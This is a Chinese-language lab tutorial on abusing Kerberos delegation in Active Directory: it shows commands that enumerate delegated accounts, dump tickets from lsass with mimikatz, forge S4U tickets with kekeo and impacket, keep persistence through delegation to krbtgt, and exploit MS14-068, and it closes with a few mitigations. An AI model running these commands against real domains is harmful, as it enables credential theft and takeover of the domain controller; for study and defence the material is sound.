从网络攻击的角度来看，如果攻击者控制了服务 A 的账号，并且服务 A 配置了到域控的 CIFS 服务的约束性委派。则攻击者可以利用服务 A 以 administrator 身份访问域控的 CIFS 服务，即相当于控制了域控。  

筛选非委派属性的账号
----------

  
注：域控主机账户默认开启非约束委派

### 1.PowerSploit 下的 PowerView.ps1 脚本

```
Import-Module .\PowerView.ps1; 查询域中配置非约束委派的账户Get-NetUser -Unconstrained -Domain 0day.orgGet-NetUser -Unconstrained -Domain 0day.org | select name查询域中配置非约束委派的主机：Get-NetComputer -Unconstrained -Domain 0day.org | select name
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI1DIyMdv9H8NKXHYNRNV5fzVCdvyIT5PjLtBbNFooKPSbOeOEYibxeEg/640?wx_fmt=png)

### 2.ADFind

  
使用参数

```
AdFind [switches] [-b basedn] [-f filter] [attr list]
```

参数说明：

•-b：指定要查询的根节点 •-f：LDAP 过滤条件 •attr list：需要显示的属性

  
查找域中配置非约束委派的用户：  

```
AdFind.exe -b "DC=0day,DC=org" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
```

  
查找域中配置非约束委派的主机：  

```
AdFind.exe -b "DC=0day,DC=org" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIwslPJp6OYg5Cl63gLnxlVBJE20KRuCFmQiaicbMVwLzhB7tSBqYibRnZQ/640?wx_fmt=png)

### 3.ldapsearch

  
kali 自带，可以在域外使用  
查找域中配置非约束委派的用户：  

```
ldapsearch -x -H ldap://192.168.200.143:389 -D "CN=administrator,CN=Users,DC=0day,DC=org" -w admin\!\@\#45 -b "DC=0day,DC=org" "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" |grep -iE "distinguishedName"
```

  
查找域中配置非约束委派的主机：  

```
ldapsearch -x -H ldap://192.168.200.146:389 -D "CN=administrator,CN=Users,DC=0day,DC=org" -w admin\!\@\#45 -b "DC=0day,DC=org" "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" |grep -iE "distinguishedName"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIy27dhvwm21rw90ibjRRZT2rbQlSnoaHjdCibnkoNHojRVJy2MAXOWjRg/640?wx_fmt=png)

筛选约束性委派属性的账号
------------

### 1.ldapsearch

  
查找域中配置约束委派用户:  

```
ldapsearch -x -H ldap://192.168.200.146:389 -D "CN=administrator,CN=Users,DC=0day,DC=org" -w admin\!\@\#45 -b "DC=0day,DC=org" "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"
```

  
查找域中配置约束委派的主机：  

```
ldapsearch -x -H ldap://192.168.200.146:389 -D "CN=administrator,CN=Users,DC=0day,DC=org" -w admin\!\@\#45 -b "DC=0day,DC=org" "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaISBKC6W7acOrffdr4earrY7xqSHXm83Uwnv38dS6Sjwqiaw4tUusFBnw/640?wx_fmt=png)

### 2.ADFind

  
查找域中配置约束委派用户:  

```
AdFind.exe -b "DC=0day,DC=org" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
```

  
查找域中配置约束委派的主机：  

```
AdFind.exe -b "DC=0day,DC=org" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIjyibUOEhcsVfUjBvs1VFdnIzNf7rTjtfOEDHV4vYPqCQtJ6Idppv6Dg/640?wx_fmt=png)

### 3.Empire 下的 PowerView.ps1 脚本

```
Import-Module .\powerview.ps1; 查询域中配置约束委派的账号Get-DomainUser -TrustedToAuth -Domain 0day.org | select name或Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl查询域中配置约束委派的主机Get-DomainComputer -TrustedToAuth -Domain 0day.org | select name或Get-DomainComputer -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIXRCIvUoPia79yiay6lL3UtgHRdhe4ROE0sJRe8JsnK3M8wibb8fVdPz9w/640?wx_fmt=png)

查询某用户是否具有委派性
------------

```
Import-Module .\powerview.ps1;Get-DomainUser 域用户名 -Properties  useraccountcontrol,msds-allowedtodelegateto| fl
```

当该账号没委派属性时，查询不出任何信息  

当服务账号被设置为 ** 非约束性委派 ** 时，其 userAccountControl 属性会包含为 TRUSTED_FOR_DELEGATION  

当被设置为 ** 约束性委派 ** 时，其 userAccountControl 属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION，且 msds-allowedtodelegateto 属性会被设置为哪些 SPN。  

非约束委派攻击
-------

  
非约束委派：当 user 访问 service1 时，如果 service1 的服务账号开启了`unconstrained delegation`（非约束委派），则当`user`访问`service1`时会将 user 的`TGT`发送给`service1`并保存在内存中以备下次重用，然后`service1` 就可以利用这张`TGT`以 user 的身份去访问域内的任何服务（任何服务是指 user 能访问的服务）了  

操作环境：

• 域：0day.org• 域控：windows server 2008R2，主机名：OWA2010SP3，IP：`192.168.3.142`• 域管账户：sqladmin• 域内主机：windows 8，主机名：PC-mary-0day，IP：192.168.3.63，用户：mary(普通域用户)

**注**：在 Windows 系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的  

### 1. 查找非约束委派主机账号

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIurd1V39n2XNkMxoIz6RwDNWZ2rw14qxdIUicskLzZ1cjvmuLty76eRQ/640?wx_fmt=png)

### 2. 导出票据

先访问域控，可以看到是访问失败的  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIG15ibJiaEDetFic1DlrEZfmeetKVhCQRtBcXN54lOREcicBrM8IpdibdeHw/640?wx_fmt=png)

  
我们用 sqladmin 或者任意域管账号访问 win8（这里域管账号登录在任意一台机器都可以）  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIbOB8Ja1qhoLicsULiaibJ9lVEbzUPsicaCwnoIhYE9hIqSBxo7b3eCGtzw/640?wx_fmt=png)

  
此时，在主机 win8 的 lsass.exe 内存中就会有域用户 sqladmin 的 TGT 票据。  
我们在 win8 上以管理员权限运行 mimikatz，执行以下命令  

```
privilege::debug 导出票据sekurlsa::tickets /export
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIbUdJKoALhdbcicZ6ibfwvBtkicFEq5OCJE3brvveM1JKaQ7iaeAV7Jo8pg/640?wx_fmt=png)

### 3. 注入票据

  
用 mimikatz 将这个票据导入内存中，然后访问域控。  

```
导入票据kerberos::ptt [0;33f6ebf]-2-0-60a00000-sqladmin@krbtgt-0DAY.ORG.kirbi查看票据kerberos::list
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIAlkjamZDZzAiaWbxuqJOeN1luzzEFH0q44Kficy40XocJtOGxxQkuEhQ/640?wx_fmt=png)

### 4. 访问域控

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIpKnEMmVhORVlakVZtCWFs2MKXmiadJg5BRHzD8COhwIW2ZicH0n4hAQA/640?wx_fmt=png)

约束性委派攻击
-------

  
操作环境：

• 域：0day.org• 域内主机：`windows 7`，主机名：PC-jack-0day，IP：192.168.3.62，用户：jack• 域控：OWA2010SP3

  
们设置了机器用户 PC-jack-0day 对 OWA2010SP3 的`cifs`服务的委派

### 1. 查找约束性委派的主机账号

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaICRE7Od1Y0IPdLeDEn0JMCgsIjO9phYefUl3JN8k103giaDUcPZnJfLA/640?wx_fmt=png)

### 2. 请求用户 TGT

  
已经知道服务用户明文的条件下，我们可以用 kekeo 请求该用户的 TGT

```
tgt::ask /user:PC-JACK-0DAY /domain:0day.org /password:password /ticket:test.kirbi
```

参数：  
`/user`: 服务用户的用户名  
`/password`: 服务用户的明文密码  
`/domain`: 所在域名  
`/ticket`: 指定票据名称，不过这个参数没有生效，可以忽略  
kekeo 同样也支持使用`NTLM Hash`  
在请求服务用户的 TGT 那步直接把`/password`改成`/NTLM`即可  
这里我们知道 PC-JACK-0DAY 的 ntlm hash 为：768623e06fae601be0c04759c87d93d3  
我们执行：

```
tgt::ask /user:PC-JACK-0DAY /domain:0day.org /NTLM:768623e06fae601be0c04759c87d93d3 /ticket:test.kirbi
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIgGic5V3icicK1H1aG6E4Il3iap3eUyLWZP5mhkDpq59Iea6vzD84znUDLQ/640?wx_fmt=png)

  
得到 TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi  

### 3. 获取 ST

  
然后我们可以使用这张 TGT 通过伪造 s4u 请求以`administrator`用户身份请求访问`OWA2010SP3 CIFS`的 ST  

```
tgs::s4u /tgt:TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIdqVmmibDYAJhAIwILuYOMmJWbgGsqdYKhDmPFbl7Cp2MlXDV3kadW1A/640?wx_fmt=png)

  
`S4U2Self`获取到的 ST1 以及`S4U2Proxy`获取到的 OWA2010SP3 CIFS 服务的 ST2 会保存在当前目录下  

### 4. 注入 ST2

  
然后我们用 mimikatz 将 ST2 导入当前会话即可  

```
kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~OWA2010SP3.0day.org@0DAY.ORG.kirbi
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIoxyrbDXORYq4YQiasQcFW6icMBl6cAupJmib0FnyzYTRQWibiciaiaSGiaGic1A/640?wx_fmt=png)

### 5. 访问域控

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI57V0OJpsvNWxftsA0gAj4GwrjEzT9kEHdialXm7THQ8L3twJVric10Kw/640?wx_fmt=png)

### 6. 不知道服务用户密码的情况

如果我们不知道服务用户的明文和 NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用`mimikatz`直接从内存中把服务用户的 TGT dump 出来  

```
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaInkD5V38RlzyYmQIo2e95K1F9ibPdjv6eK5Fcq4vJGrYPlUkbO8KtACg/640?wx_fmt=png)

  
**注**：`sekurlsa::tickets`是列出和导出所有会话的`Kerberos`票据，`sekurlsa::tickets`和`kerberos::list`不同，sekurlsa 是从内存读取，也就是从 lsass 进程读取，这也就是为什么`sekurlsa::tickets /export`需要管理员权限的原因。并且`sekurlsa::tickets`的导出不受密钥限制，sekurlsa 可以访问其他会话（用户）的票证。  
既然服务用户的 TGT 导出来了，我们就跳过`tgt::ask`请求 TGT 这步，直接`tgs::s4u`  

```
tgs::s4u /tgt:[0;3e7]-2-1-40e00000-PC-JACK-0DAY$@krbtgt-0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI2m3uFdLMGJ7Smk4hnHYXl4gSibYRZqiaL0MdotupQKzfSc8YjnaAqEpw/640?wx_fmt=png)

```
kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~OWA2010SP3.0day.org@0DAY.ORG.kirbi
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIVrdzQenuib92TseoPA2DLEsgZicfKBNofSfzeNuz4hG47Nicv7ZlyHVtA/640?wx_fmt=png)

抓包分析约束性委派攻击过程
-------------

  
这里可以看到有 6 个请求  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIUeiaAjDH2l5uu8H5m6ibY5iabSt1OicZqEHKwvcJvKPlKFdsEcoppPBbZQ/640?wx_fmt=png)

### 1.AS-REQ

  
可以看到用户 PC-JACK-0DAY 用户向 KDC 请求一张 TGT  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIlQJlkqT9TicqWkvhgXzk3oKHks3Q67bM8DddO13GTiaz47tPPjOJg1zQ/640?wx_fmt=png)

### 2.AS-REP

  
返回一张 TGT，这张 TGT 代表的就是 PC-JACK-0DAY 这个用户  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIOWEqSfuD9FYOPPMBnet2SDPn0EIZX1BicrWo2pJGoUuYb2EQl7msKbw/640?wx_fmt=png)

### 3. 第一次的 TGS-REQ 和 TGS-REP

  
用这张`TGT`发送`S4U2self`请求，以`Administrator`的名义向`TGS`申请了一张访问自身服务的票据，ST1

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIwfuBMrHg6vdL5oxu2Aqu2SNR8ia0b6Z698UeLVSn5K05rMlDTukyUibg/640?wx_fmt=png)

### 4. 第二次的 TGS-REQ 和 TGS-REP

  
得到`ST1`之后，然后会带上 ST1 再次向`KDC`发起`SU42Proxy`请求，以`administrator`的名义请求一张访问`OWA2010SP3 cifs`服务的票据，ST2  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIfIB4AL9p8rD4UHLHBELMicickV7e09EcbDaiblEYla59EIHIUf8VGxkBg/640?wx_fmt=png)

利用约束性委派进行权限维持
-------------

  
我们都知道 TGT 的生成是由`krbtgt`用户加密和签名的，如果我们能委派域上的用户去访问`TGS`，那么就可以伪造任意用户的 TGT 了，黄金票据通常情况下我们是用`krbtgt`的 hash 来伪造 TGT，不过我们通过约束委派也能达到同样的效果。  

**注**：`TGS`默认的 spn 是`krbtgt/domain name`，我们操作环境是`krbtgt/QIYOU.COM`  
`krbtgt`默认是禁用的而且无法启用，所以我们无法使用界面来添加这个 SPN。  
我们可以使用 powershell 来添加

```
Import-Module ActiveDirectory$user = Get-ADUser test -Properties "msDS-AllowedToDelegateTo"Set-ADObject $user -Add @{ "msDS-AllowedToDelegateTo" = @("krbtgt/0day.org") }
```

  
我们控制的用户选择的是自己创建的 test 域用户。密码 Yicunyiye123  

• 域控：OWA2010SP3 192.168.200.146• 域：0day.org• 攻击机：Kali

  
首先修改 kali 的 / etc/hosts / 文件，添加如下内容  

```
192.168.200.146 0day.org192.168.200.146 OWA2010SP3
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIHW0IDicriaiaIOFXpqDK5qicUwqYs1QCZZwfQWBKCtT5dibrhgtxrO7QULA/640?wx_fmt=png)

  
创建域用户 test 然后赋予 SPN  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIfpbmHtQyUgsyErxM7ia9OicLRuk7upzT3My6ZGDllibcABK4B5CWjXFZw/640?wx_fmt=png)

然后在域控上配置 test 用户到 krbtgt 用户的约束性委派。 

```
Import-Module ActiveDirectory$user = Get-ADUser test -Properties "msDS-AllowedToDelegateTo"Set-ADObject $user -Add @{ "msDS-AllowedToDelegateTo" = @("krbtgt/0day.org") }
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIjUNu0EWRaDvaQicbgIZTGdGMy0DvhbsBWib4WaNXn6o8TQiayN3w2wwDg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI54wXgeIMUFAict4ZZ9IoVmKOVNH2c26traqic2BXeqtJSyf1hqcGzh7A/640?wx_fmt=png)

  
可以看到 test 账户具有委派性  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIyc2NRCG1nGibBSZRwrV72f1qNBWhEo4Q9xz8hTEZm0qY8LqxibzQTNDA/640?wx_fmt=png)

  
然后在 kali 上攻击  

```
python3 getST.py -dc-ip 192.168.200.146 -spn krbtgt/0day.org -impersonate administrator 0day.org/test:Yicunyiye123
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIgBBSsCP4L0Cic1LtY2tKsAHKKLabic2xPpS3Uic1ekSialvrGTOO2hMkzA/640?wx_fmt=png)

```
export KRB5CCNAME=administrator.ccachepython3 wmiexec.py -no-pass -k administrator@OWA2010SP3 -dc-ip 192.168.200.146
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI9SdgibjQwVL4tzNjC1ia38HzlriaepibnI3vBlSQmZpxzGsmEnbUOiaSxMQ/640?wx_fmt=png)

域委派的防御措施
--------

  
因为委派比较实用我们也不能说直接简单粗暴关闭该功能。  
1. 高权限用户可以设置不能被委派  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIF925W7ySmticrMSb6W5ichDIQAK5zugp9lQHHTslBEOD9ZUGGRibps7uQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIRS9ALwPnPric9setbszXO1st9GeEicRSAP12WRgo0jYDwYicYEcoc9uuw/640?wx_fmt=png)

  
可以看到 administrator 是无法成功的，但是 sqladmin 可以  
2.Windows 2012 R2 及更高的系统建立了受保护的用户组，组内用户不允许被委派，这是有效的手段。受保护的用户组，当这个组内的用户登录时（windows 2012 R2 域服务器，客户端必须为 Windows 8.1 或之上），不能使用 NTLM 认证；适用于`Windows Server 2016`，`Windows Server 2012 R2`、 `Windows Server 2012`  
3. 一般 TGT 4 小时后失效  
4.Kerberos 预认证时不使用 DES 或者 RC4 等加密算法；  

PAC
===

具体查看：[Windows 内网协议学习 Kerberos 篇之 PAC]

https://www.anquanke.com/post/id/192810

  
kerberos 的流程：  
1. 用户向 KDC 发起 AS_REQ, 请求凭据是用户 hash 加密的时间戳，KDC 使用用户 hash 进行解密，如果结果正确返回用 krbtgt hash 加密的 TGT 票据  
2. 用户凭借 TGT 票据向 KDC 发起针对特定服务的 TGS_REQ 请求，KDC 使用 krbtgt hash 进行解密，如果结果正确，就返回用服务 hash 加密的 TGS 票据  
3. 用户拿着 TGS 票据去请求服务，服务使用自己的 hash 解密 TGS 票据。如果解密正确，就允许用户访问。  
上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的 hash 正确，那么就可以拿到 TGT，有了 TGT，就可以拿到 TGS，有了 TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?” 的问题，并没有解决 “What can I do?” 的问题。  
在 Kerberos 最初设计的流程里说明了如何证明客户端的真实身份，但是并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。所以微软为了解决权限这个问题，引入了 PAC (Privilege Attribute Certificate，特权属性证书) 的概念。  

MS14-068
--------

  
MS14-068 编号 CVE-2014-6324，补丁为 3011780，如果自检可在域控制器上使用命令检测。  

```
systeminfo |find "3011780"
```

为空说明该服务器存在 MS14-068 漏洞  

环境：  
域机器：PC-JACK-0DAY，win7，知道一个域用户和密码：jack\0day，admin!@#45，拥有该机器的管理员权限  
域控：OWA2010SP3，ip:192.168.3.142  
**1. 生成票据**  
  

```
MS14-068.exe -u jack@0day.org -p admin!@#45 -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142  #MS14-068.exe -u 域用户@0day.org -p 域用户jack密码 -s 域用户jack的SID -d 域控ip
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIM28RP5fWE0XY1mxAibenh8DIHI4CrgedLvdlDWSyhmX8BNhGYPqm5DA/640?wx_fmt=png)

  
可以看到生成了 TGT_jack@0day.org.ccache  
**2.mimikatz 导入票据**  
  

```
kerberos::ptc 票据路径
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIgzqNtAXgoLWibuWIXkQCjMjAFOicfZXv5woQfoR48ew2ohKdOvc6Ll9Q/640?wx_fmt=png)

  
**3. 访问域控**  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIM28RP5fWE0XY1mxAibenh8DIHI4CrgedLvdlDWSyhmX8BNhGYPqm5DA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读：**

**[内网渗透 | Kerberos 协议与 Kerberos 认证原理](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497760&idx=1&sn=4c0f57ba9203cc115a85cd0c011fdc43&chksm=ec1cad1fdb6b2409ec3ef25008ad6834a7220997a914308a478ed9d682c84c7b370e423a878c&scene=21#wechat_redirect)  
**

**[内网渗透 | Kerberos 协议相关安全问题分析与利用](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497830&idx=1&sn=9dfacfb1a9513c860a3aeb268770097e&chksm=ec1cad59db6b244f05d44dc179ee9969acea9b0371c653992d9a65a80ae235cfa812186316db&scene=21#wechat_redirect)  
**

[**内网渗透 | SPN 与 Kerberoast 攻击讲解**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497831&idx=1&sn=cdc3aef06751705f8156f35115f6892d&chksm=ec1cad58db6b244e5174b026c9699cf70066ac919ee2213c69742e74bd990be224feee996c03&scene=21#wechat_redirect)  

本月报名可以参加抽奖送 Kali NetHunter 手机的优惠活动  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497897&idx=1&sn=5801b91d451b4c253eb3e2c5ff220673&chksm=ec1cad96db6b2480ce0be49a377819558c06b29603b812512b7cb52ca0c123bc444764f11502&scene=21#wechat_redirect)

**点赞，转发，在看**

原创投稿作者：11ccaab

未经授权，禁止转载

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)